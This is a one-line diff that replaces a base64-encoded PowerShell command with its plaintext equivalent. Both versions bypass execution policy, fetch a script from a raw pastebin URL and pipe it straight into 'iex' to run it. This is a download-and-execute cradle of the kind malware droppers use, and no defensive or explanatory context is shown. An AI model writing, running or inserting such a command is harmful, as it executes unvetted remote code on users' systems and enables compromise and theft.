@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy Bypass -EncodedCommand aQByAG0AIAAnAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQBXAC8AdwB2ADEASAB2AEcANABUACcAIAAgAHwAIABpAGUAeAA=
+powershell -ExecutionPolicy Bypass -Command "irm 'https://pastebin.com/raw/wv1HvG4T' | iex"
